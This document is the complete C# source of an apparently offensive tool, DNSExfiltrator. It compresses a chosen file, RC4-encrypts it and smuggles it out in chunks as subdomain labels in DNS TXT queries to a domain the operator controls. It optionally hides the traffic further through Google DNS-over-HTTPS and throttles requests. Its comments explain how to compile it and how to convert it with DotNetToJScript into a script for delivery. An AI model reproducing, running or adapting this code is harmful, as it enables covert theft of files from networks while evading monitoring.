/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
As a standalone executable:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:dnsExfiltrator.exe dnsExfiltrator.cs
	
As a DLL:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /reference:System.IO.Compression.dll /out:dnsExfiltrator.dll dnsExfiltrator.cs
*/
using System;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Linq;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
	
namespace DNSExfiltrator
{
	//============================================================================================
	// This class performs the actual data exfiltration using DNS requests covert channel
	//============================================================================================
	[ComVisible(true)]
	public class DNSExfiltrator
	{	
		//------------------------------------------------------------------------------------
        // Constructors for the the DNSExfiltrator class
        //------------------------------------------------------------------------------------
		public DNSExfiltrator()
        {
        }
		
		//------------------------------------------------------------------------------------
		// Print usage
		//------------------------------------------------------------------------------------
		private static void PrintUsage()
		{
			Console.WriteLine("Usage:");
			Console.WriteLine("{0} <file> <domainName> <password> [-h] [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
			Console.WriteLine("\t-h:\t\t[OPTIONNAL] Flag enabling DoH (DNS over HTTP) usage. Uses Google's DoH servers.");
			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
			Console.WriteLine("\tlabelMaxSize:\t[OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
		}
		
		//------------------------------------------------------------------------------------
		// Outputs to console with color
		//------------------------------------------------------------------------------------
		private static void PrintColor(string text)
		{
			if (text.StartsWith("[!]")) { Console.ForegroundColor = ConsoleColor.Red;}
			else if (text.StartsWith("[+]")) { Console.ForegroundColor = ConsoleColor.Green;}
			else if (text.StartsWith("[*]")) { Console.ForegroundColor = ConsoleColor.Blue;}
			
			Console.WriteLine(text);
			
			// Reset font color
			Console.ForegroundColor = ConsoleColor.White;
		}
		
		//------------------------------------------------------------------------------------
		// Outputs to console with color
		//------------------------------------------------------------------------------------
		private static string Encode(byte[] data)
		{
			string result = String.Empty;
			
			// characters used in DNS names through the Win32 API resolution library do not
			// support all of the base64 characters. We have to use the base64url standard:
			// '/' and '+' characters are substituded
			// '=' padding character are removed and will need to be recomputed at the remote end
			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
			return result;
		}
		
		//------------------------------------------------------------------------------------
		// Required entry point signature for DotNetToJScript
		// Convert the dnsExfiltrator DLL to a JScript file using this command:
		// c:\> DotNetToJScript.exe -v Auto -l JScript -c DNSExfiltrator.DNSExfiltrator -o dnsExfiltrator.js dnsExfiltrator.dll
		//
		// Then add the following section of code in the generated dnsExfiltrator.js, just after the object creation:
		//		var args = "";
		//		for (var i = 0; i < WScript.Arguments.length-1; i++) {
		//			args += WScript.Arguments(i) + "|";
		//		}
		//		args += WScript.Arguments(i);
		//		o.GoFight(args);
		//------------------------------------------------------------------------------------
		public void GoFight(string args)
		{
			Main(args.Split('|'));
		}
		
		//------------------------------------------------------------------------------------
		// MAIN FUNCTION
		//------------------------------------------------------------------------------------
        public static void Main(string[] args)
        {
			// Variables
			string filePath = String.Empty;
			string domainName = String.Empty;
			string password = String.Empty;

			string fileName = String.Empty;
			bool useDoH = false; // Whether or not to use DoH for resolution
			string dnsServer = null;
			int throttleTime = 0;
			string data = String.Empty;
			string request = String.Empty;
			int requestMaxSize = 255; // DNS request max size = 255 bytes
			int labelMaxSize = 63; // DNS request label max size = 63 chars
			
			//--------------------------------------------------------------
			// Perform arguments checking
			if(args.Length < 3) {
				PrintColor("[!] Missing arguments");
				PrintUsage();
				return;
			}
			
			filePath = args[0];
			domainName = args[1];
			password = args[2];
			fileName = Path.GetFileName(filePath);
			
			if (!File.Exists(filePath)) {
				PrintColor(String.Format("[!] File not found: {0}",filePath));
				return;
			}
			
			// Do we have additionnal arguments ?
			if (new[] {4, 5, 6, 7}.Contains(args.Length)) {
				int i = 3;
				int param;
				while (i < args.Length) {
					if (args[i].StartsWith("s=")) {
						dnsServer = args[i].Split('=')[1];
						PrintColor(String.Format("[*] Working with DNS server [{0}]", dnsServer));
					}
					else if (args[i].StartsWith("t=")) {
						throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
						PrintColor(String.Format("[*] Setting throttle time to [{0}] ms", throttleTime));
					}
					else if (args[i].StartsWith("r=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 255) { requestMaxSize = param; }
						PrintColor(String.Format("[*] Setting DNS request max size to [{0}] bytes", requestMaxSize));
					}
					else if (args[i].StartsWith("l=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 63) { labelMaxSize = param; }
						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
					}
					else if (args[i] == "-h") {
						useDoH = true;
						PrintColor("[*] Using DNS over HTTP for name resolution.");
					}
					i++;
				}
			}
			
			//--------------------------------------------------------------
			// Compress and encrypt the file in memory
			PrintColor(String.Format("[*] Compressing (ZIP) the [{0}] file in memory",filePath));
			using (var zipStream = new MemoryStream())
			{
				using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
				{
					var entryFile = archive.CreateEntry(fileName);
					using (var entryStream = entryFile.Open())
					using (var streamWriter = new BinaryWriter(entryStream))
					{
						streamWriter.Write(File.ReadAllBytes(filePath));
					}
				}

				zipStream.Seek(0, SeekOrigin.Begin);
				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}], then converting it to a base64 representation",password));
				data = Encode(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
			}
			
			//--------------------------------------------------------------
			// Compute the size of the chunk and how it can be split into subdomains (labels)
			// https://blogs.msdn.microsoft.com/oldnewthing/20120412-00/?p=7873

			// The bytes available to exfiltrate actual data, keeping 10 bytes to transmit the chunk number:
			// <chunk_number>.<data>.<data>.<data>.domainName.
			int bytesLeft = requestMaxSize - 10 - (domainName.Length+2); // domain name space usage in bytes
			
			int nbFullLabels = bytesLeft/(labelMaxSize+1);
			int smallestLabelSize = bytesLeft%(labelMaxSize+1) - 1;
			int chunkMaxSize = nbFullLabels*labelMaxSize + smallestLabelSize;
			int nbChunks = data.Length/chunkMaxSize + 1;
			PrintColor(String.Format("[+] Maximum data exfiltrated per DNS request (chunk max size): [{0}] bytes", chunkMaxSize));
			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
			
			//--------------------------------------------------------------
			// Send the initial request advertising the fileName and the total number of chunks
			request = "init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName;
			PrintColor("[*] Sending 'init' request");

			string reply = String.Empty;
			try {
				if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
				else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
				
				if (reply != "OK") {
					PrintColor(String.Format("[!] Unexpected answer for an initialization request: [{0}]", reply[0]));
					return;
				}
			}
			catch (Win32Exception e) {
				PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
				return;
			}
			
			//--------------------------------------------------------------
			// Send all chunks of data, one by one
			PrintColor("[*] Sending data...");
			
			string chunk = String.Empty;
			int chunkIndex = 0;
			int countACK;
			
			for (int i = 0; i < data.Length;) {
				// Get a first chunk of data to send
				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length-i));
				int chunkLength = chunk.Length;

				// First part of the request is the chunk number
				request = chunkIndex.ToString() + ".";
				
				// Then comes the chunk data, split into sublabels
				int j = 0;
				while (j*labelMaxSize < chunkLength) {
					request += chunk.Substring(j*labelMaxSize, Math.Min(labelMaxSize, chunkLength-(j*labelMaxSize))) + ".";
					j++;
				}

				// Eventually comes the top level domain name
				request += domainName;
				
				// Send the request
				try {
					if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
					else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
					
					countACK = Convert.ToInt32(reply);
					
					if (countACK != chunkIndex) {
						PrintColor(String.Format("[!] Chunk number [{0}] lost.\nResending.", countACK));
					}
					else {
						i += chunkMaxSize;
						chunkIndex++;
					}
				}
				catch (Win32Exception e) {
					PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
					return;
				}
				
				// Apply throttle if requested
				if (throttleTime != 0) {
					Thread.Sleep(throttleTime);
				}
			}
			
			PrintColor("[*] DONE !");
		} // End Main
		
	}
	
	//============================================================================================
	// This class provides RC4 encryption functions
	// https://bitlush.com/blog/rc4-encryption-in-c-sharp
	//============================================================================================
	public class RC4Encrypt
	{
		public static byte[] Encrypt(byte[] key, byte[] data)
		{
			return EncryptOutput(key, data).ToArray();
		}

		private static byte[] EncryptInitalize(byte[] key)
		{
			byte[] s = Enumerable.Range(0, 256)
			.Select(i => (byte)i)
			.ToArray();

			for (int i = 0, j = 0; i < 256; i++) {
				j = (j + key[i % key.Length] + s[i]) & 255;
				Swap(s, i, j);
			}

			return s;
		}
   
		private static System.Collections.Generic.IEnumerable<byte> EncryptOutput(byte[] key, System.Collections.Generic.IEnumerable<byte> data)
		{
				byte[] s = EncryptInitalize(key);
				int i = 0;
				int j = 0;

				return data.Select((b) =>
				{
					i = (i + 1) & 255;
					j = (j + s[i]) & 255;
					Swap(s, i, j);

					return (byte)(b ^ s[(s[i] + s[j]) & 255]);
				});
		}

		private static void Swap(byte[] s, int i, int j)
		{
			byte c = s[i];
			s[i] = s[j];
			s[j] = c;
		}
	}	

	//============================================================================================
	// This class provides DNS over HTTP resolution using the Google DOH experimental servers
	//============================================================================================
    public class DOHResolver
    {
		
		static string googleDOHURI = "https://dns.google.com/experimental?ct&body=";
		
		public static string GetTXTRecord(string domain)
		{
			List<byte> dnsPacket = new List<byte>();
			List<byte> dnsQuery = new List<byte>();
						
			//---- Crafting the DNS packet, starting with the headers
			// Transaction ID = 0x00002
			// Flags: standard query = 0x0100
			// Questions: 1 question = 0x0001
			// Answer RRs: 0 = 0x0000
			// Authority RRs: 0 = 0x0000
			// Additional RRs: 0 = 0x0000
			dnsPacket.AddRange(new byte[]{0x00, 0x02, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}); 
						
			foreach (string label in domain.Split('.')) {
				dnsQuery.Add(Convert.ToByte(label.Length)); // Label size
				dnsQuery.AddRange(Encoding.UTF8.GetBytes(label)); // Label
			}
			dnsQuery.Add(0x00); // Terminating labels
			
			// QType: TXT = 0x0010
			// QClass: In (internet) = 0x0001
			dnsQuery.AddRange(new byte[]{0x00, 0x10, 0x00, 0x01});
			
			//---- Concatenate the headers and the Query
			dnsPacket.AddRange(dnsQuery);
						
			// Converting the dnsWirePacket to a base6url representation
			string dohParameter = Convert.ToBase64String(dnsPacket.ToArray()).Replace("=","").Replace("/","_").Replace("+","-");
			string dohQuery = googleDOHURI + dohParameter;
			
			//------------------------------------------------------------------
			// Perform the DOH request to the server
			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
			byte[] responsePacket = null;
						
            //---- Check if an HTTP proxy is configured on the system, if so, use it
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Proxy = defaultProxy;
            }
			
			//---- Sending the DOH request and receiving the answer in a byte array
			responsePacket = webClient.DownloadData(dohQuery);
			
			/* DEBUG SECTION
			Console.WriteLine("Response received:");
			int i = 0;
			foreach (byte b in responsePacket) {
				Console.WriteLine("Packet[{0}]: {1} --> {2}",i++,Convert.ToInt32(b), Convert.ToChar(b));
			}
			*/
						
			// DNS response structure is made of: [Headers] + [DNS Query] + [DNS Answer]
			// Check we have at least one Answer Resource Records --> RR field
			if (Convert.ToInt32(responsePacket[7]) > 0) {
				int answerIndex = 12 + dnsQuery.Count; // Header size + Query size -1 to get the index of the array element
				
				// Check the type of answer is TXT
				if (Convert.ToInt32(responsePacket[answerIndex + 3]) == 0x10) {
					int txtLength = Convert.ToInt32(responsePacket[answerIndex + 12]);
					
					byte[] txtRecord = new byte[txtLength];
					Array.Copy(responsePacket,answerIndex + 13, txtRecord, 0, txtLength);
					
					return Encoding.UTF8.GetString(txtRecord);
				}
				else {
					throw new Win32Exception("DNS answer does not contain a TXT resource record.");
				}
			}
			else {
				throw new Win32Exception("DNS answer does not contain any resource record.");
			}
		}
	}
	
	//============================================================================================
	// This class provides DNS resolution by using the PInvoke calls to the native Win32 API
	//============================================================================================
    public class DnsResolver
    {       
		//---------------------------------------------------------------------------------
		// Import WIN32 API extern function
		//---------------------------------------------------------------------------------
        [DllImport("dnsapi", EntryPoint="DnsQuery_W", CharSet=CharSet.Unicode, SetLastError=true, ExactSpelling=true)]
        private static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)]ref string pszName, DnsRecordTypes wType, DnsQueryOptions options, ref IP4_ARRAY dnsServerIpArray, ref IntPtr ppQueryResults, int pReserved);

        [DllImport("dnsapi", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
		
		//---------------------------------------------------------------------------------
		// Resolving TXT records only (for now)
		//---------------------------------------------------------------------------------
        public static string GetTXTRecord(string domain, string serverIP = null)
        {
			IntPtr recordsArray = IntPtr.Zero;
			IntPtr dnsRecord = IntPtr.Zero;
            TXTRecord txtRecord;
			IP4_ARRAY dnsServerArray = new IP4_ARRAY();
			
			if (serverIP != null) {
				uint address = BitConverter.ToUInt32(IPAddress.Parse(serverIP).GetAddressBytes(), 0);
				uint[] ipArray = new uint[1];
				ipArray.SetValue(address, 0);
				dnsServerArray.AddrCount = 1;
				dnsServerArray.AddrArray = new uint[1];
				dnsServerArray.AddrArray[0] = address;
			}
           
			// Interop calls will only work on Windows platform (no mono c#)
			if (Environment.OSVersion.Platform != PlatformID.Win32NT)
            {
                throw new NotSupportedException();
            }
			
			ArrayList recordList = new ArrayList();
			try
			{
				int queryResult = DnsResolver.DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
				
				// Check for error
				if (queryResult != 0)
				{
					throw new Win32Exception(queryResult);
				}
				
				// Loop through the result record list
				for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
				{
					txtRecord = (TXTRecord) Marshal.PtrToStructure(dnsRecord, typeof(TXTRecord));
					if (txtRecord.wType == (int)DnsRecordTypes.DNS_TYPE_TXT)
					{
						//Console.WriteLine("Size of array: {0}",txtRecord.dwStringCount);
						string txt = Marshal.PtrToStringAuto(txtRecord.pStringArray);
						recordList.Add(txt);
					}
				}
			}
			finally
			{
				DnsResolver.DnsRecordListFree(recordsArray, 0);
			}
			
			// Return only the first TXT answer
			return (string)recordList[0];
		}

		//---------------------------------------------------------------------------------
		// WIN32 DNS STRUCTURES
		//---------------------------------------------------------------------------------
		/// <summary>
		/// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms682139(v=vs.85).aspx
		/// </summary>
		public struct IP4_ARRAY
		{
			/// DWORD->unsigned int
			public UInt32 AddrCount;
			/// IP4_ADDRESS[1]
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)] public UInt32[] AddrArray;
		}
		
		[StructLayout(LayoutKind.Sequential)]
        private struct TXTRecord
        {
			// Generic DNS record structure
            public IntPtr pNext;
            public string pName;
            public short wType;
            public short wDataLength;
            public int flags;
            public int dwTtl;
            public int dwReserved;
            
			// TXT record specific
			public int dwStringCount;
            public IntPtr pStringArray;
            
        }
		
		/// <summary>
		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
		/// </summary>
		[Flags]
		private enum DnsQueryOptions
		{
			DNS_QUERY_STANDARD = 0x0,
			DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE = 0x1,
			DNS_QUERY_USE_TCP_ONLY = 0x2,
			DNS_QUERY_NO_RECURSION = 0x4,
			DNS_QUERY_BYPASS_CACHE = 0x8,
			DNS_QUERY_NO_WIRE_QUERY = 0x10,
			DNS_QUERY_NO_LOCAL_NAME = 0x20,
			DNS_QUERY_NO_HOSTS_FILE = 0x40,
			DNS_QUERY_NO_NETBT = 0x80,
			DNS_QUERY_WIRE_ONLY = 0x100,
			DNS_QUERY_RETURN_MESSAGE = 0x200,
			DNS_QUERY_MULTICAST_ONLY = 0x400,
			DNS_QUERY_NO_MULTICAST = 0x800,
			DNS_QUERY_TREAT_AS_FQDN = 0x1000,
			DNS_QUERY_ADDRCONFIG = 0x2000,
			DNS_QUERY_DUAL_ADDR = 0x4000,
			DNS_QUERY_MULTICAST_WAIT = 0x20000,
			DNS_QUERY_MULTICAST_VERIFY = 0x40000,
			DNS_QUERY_DONT_RESET_TTL_VALUES = 0x100000,
			DNS_QUERY_DISABLE_IDN_ENCODING = 0x200000,
			DNS_QUERY_APPEND_MULTILABEL = 0x800000,
			DNS_QUERY_RESERVED = unchecked((int)0xF0000000)
		}

		/// <summary>
		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
		/// Also see http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml
		/// </summary>
		private enum DnsRecordTypes
		{
			DNS_TYPE_A = 0x1,
			DNS_TYPE_NS = 0x2,
			DNS_TYPE_MD = 0x3,
			DNS_TYPE_MF = 0x4,
			DNS_TYPE_CNAME = 0x5,
			DNS_TYPE_SOA = 0x6,
			DNS_TYPE_MB = 0x7,
			DNS_TYPE_MG = 0x8,
			DNS_TYPE_MR = 0x9,
			DNS_TYPE_NULL = 0xA,
			DNS_TYPE_WKS = 0xB,
			DNS_TYPE_PTR = 0xC,
			DNS_TYPE_HINFO = 0xD,
			DNS_TYPE_MINFO = 0xE,
			DNS_TYPE_MX = 0xF,
			DNS_TYPE_TEXT = 0x10,       // This is how it's specified on MSDN
			DNS_TYPE_TXT = DNS_TYPE_TEXT,
			DNS_TYPE_RP = 0x11,
			DNS_TYPE_AFSDB = 0x12,
			DNS_TYPE_X25 = 0x13,
			DNS_TYPE_ISDN = 0x14,
			DNS_TYPE_RT = 0x15,
			DNS_TYPE_NSAP = 0x16,
			DNS_TYPE_NSAPPTR = 0x17,
			DNS_TYPE_SIG = 0x18,
			DNS_TYPE_KEY = 0x19,
			DNS_TYPE_PX = 0x1A,
			DNS_TYPE_GPOS = 0x1B,
			DNS_TYPE_AAAA = 0x1C,
			DNS_TYPE_LOC = 0x1D,
			DNS_TYPE_NXT = 0x1E,
			DNS_TYPE_EID = 0x1F,
			DNS_TYPE_NIMLOC = 0x20,
			DNS_TYPE_SRV = 0x21,
			DNS_TYPE_ATMA = 0x22,
			DNS_TYPE_NAPTR = 0x23,
			DNS_TYPE_KX = 0x24,
			DNS_TYPE_CERT = 0x25,
			DNS_TYPE_A6 = 0x26,
			DNS_TYPE_DNAME = 0x27,
			DNS_TYPE_SINK = 0x28,
			DNS_TYPE_OPT = 0x29,
			DNS_TYPE_DS = 0x2B,
			DNS_TYPE_RRSIG = 0x2E,
			DNS_TYPE_NSEC = 0x2F,
			DNS_TYPE_DNSKEY = 0x30,
			DNS_TYPE_DHCID = 0x31,
			DNS_TYPE_UINFO = 0x64,
			DNS_TYPE_UID = 0x65,
			DNS_TYPE_GID = 0x66,
			DNS_TYPE_UNSPEC = 0x67,
			DNS_TYPE_ADDRS = 0xF8,
			DNS_TYPE_TKEY = 0xF9,
			DNS_TYPE_TSIG = 0xFA,
			DNS_TYPE_IXFR = 0xFB,
			DNS_TYPE_AFXR = 0xFC,
			DNS_TYPE_MAILB = 0xFD,
			DNS_TYPE_MAILA = 0xFE,
			DNS_TYPE_ALL = 0xFF,
			DNS_TYPE_ANY = 0xFF,
			DNS_TYPE_WINS = 0xFF01,
			DNS_TYPE_WINSR = 0xFF02,
			DNS_TYPE_NBSTAT = DNS_TYPE_WINSR
		}
    }
}